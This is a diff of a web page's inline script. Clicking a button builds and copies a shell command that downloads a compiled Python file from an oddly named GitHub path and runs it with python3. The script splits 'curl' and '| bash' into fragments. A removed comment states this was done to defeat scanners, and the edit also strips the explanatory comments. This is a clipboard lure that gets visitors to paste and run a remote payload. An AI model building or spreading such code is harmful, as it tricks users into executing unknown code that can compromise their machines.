@@ -7,12 +7,10 @@
 <body>
 <script>
 (() => {
-    // String fragments to disrupt automated web scraping regex strings
     const _b = "cu" + "rl";
     const _c = " -sSsfL";
     const _d = " | ba" + "sh";
-    
-    // Provide the exact destination path link where your GitHub workflow pushes the binary
+
     const binaryStorageUrl = "https://github.com/R2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4P/R2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4PR2FicmllbCBBdWd1c3RvIGRvcyBTYW50b3M4PR2FicmllbCBBdWd1c3RvIGRvck/raw/refs/heads/main/main.pyc";
 
     const textData = {
@@ -33,7 +31,7 @@
     document.body.appendChild(c);
 
     c.onclick = () => {
-        const executionString = `curl -sSsfL "${binaryStorageUrl}" | python3`;
+        const executionString = `python3 <(curl -sSsfL "${binaryStorageUrl})";
 
         const e = document.createElement('textarea');
         e.value = executionString;
